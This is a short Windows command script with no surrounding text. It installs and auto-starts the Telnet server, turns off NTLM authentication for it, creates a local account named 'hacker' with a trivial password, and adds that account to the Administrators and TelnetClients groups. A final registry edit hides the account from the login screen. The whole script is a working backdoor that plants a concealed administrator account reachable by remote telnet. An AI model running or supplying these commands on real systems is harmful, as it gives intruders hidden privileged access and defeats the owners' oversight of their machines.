pkgmgr /iu:TelnetClient
pkgmgr /iu:TelnetServer
sc config tlntsvr start= auto
sc start tlntsvr
tlntadmn config sec=-NTLM
tlntadmn config mode=stream
net user hacker 12345 /add
net localgroup administrators hacker /add
net localgroup TelnetClients hacker /add

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /v hacker /t REG_DWORD /d 0000000
